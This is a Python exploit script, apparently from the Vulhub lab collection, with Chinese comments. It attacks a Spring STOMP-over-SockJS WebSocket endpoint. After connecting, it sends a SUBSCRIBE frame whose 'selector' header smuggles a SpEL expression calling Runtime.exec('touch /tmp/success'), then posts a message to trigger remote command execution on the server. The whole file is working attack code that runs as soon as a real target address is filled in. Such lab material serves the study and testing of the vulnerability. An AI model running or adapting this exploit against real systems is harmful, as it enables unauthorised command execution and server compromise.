import json
import logging
import random
import string
import sys
import threading
import time

import requests

# 配置日志
logging.basicConfig(stream=sys.stdout, level=logging.INFO)


def random_str(length):
    """生成指定长度的随机字符串"""
    letters = string.ascii_lowercase + string.digits
    return "".join(random.choice(letters) for _ in range(length))


class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f"{url}/{random.randint(0, 1000)}/{random_str(8)}"
        self.daemon = True
        self.session = requests.Session()
        self.session.headers = {
            "Referer": url,
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        }
        self.t = int(time.time() * 1000)

    def run(self):
        """运行SockJS线程，通过读取服务器保持连接"""
        url = f"{self.base}/htmlfile?c=_jp.vulhub"
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)

    def send(self, command, headers, body=""):
        """向SockJS服务器发送命令"""
        data = [command.upper(), "\n"]
        data.append("\n".join([f"{k}:{v}" for k, v in headers.items()]))
        data.append("\n\n")
        data.append(body)
        data.append("\x00")
        data = json.dumps(["".join(data)])

        response = self.session.post(f"{self.base}/xhr_send?t={self.t}", data=data)
        if response.status_code != 204:
            logging.info(f"发送 '{command}' 数据出错。")
        else:
            logging.info(f"发送 '{command}' 数据成功。")

    def __del__(self):
        """确保对象删除时会话关闭"""
        self.session.close()


# 创建SockJS客户端并启动线程
sockjs = SockJS("http://your-ip:8080/gs-guide-websocket")
sockjs.start()
time.sleep(1)

# 发送连接命令
sockjs.send("connect", {"accept-version": "1.1,1.0", "heart-beat": "10000,10000"})

# 订阅一个主题
sockjs.send(
    "subscribe",
    {
        "selector": "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
        "id": "sub-0",
        "destination": "/topic/greetings",
    },
)

# 发送一条消息
data = json.dumps({"name": "vulhub"})
sockjs.send("send", {"content-length": len(data), "destination": "/app/hello"}, data)
